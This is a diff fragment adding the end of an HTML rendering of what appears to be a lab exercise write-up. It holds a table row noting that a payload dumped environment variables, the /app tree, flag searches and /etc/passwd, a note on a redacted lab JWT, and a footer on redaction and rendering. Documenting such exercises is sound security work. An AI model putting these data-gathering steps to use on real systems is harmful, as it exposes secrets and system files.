+<td>payload #2: env, <code>/app</code> tree, the four flag searches, <code>/etc/passwd</code></td>
+</tr>
+</tbody>
+</table>
+<p>No credential, cookie, or token from the exercise platform appears in this document. The lab-issued JWT used for <code>POST /api/gallery/upload</code> is disposable and is recorded as <code>&lt;redacted&gt;</code>; every command in §3 that needs it is reproducible by registering a fresh ordinary account, which is a two-request operation.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
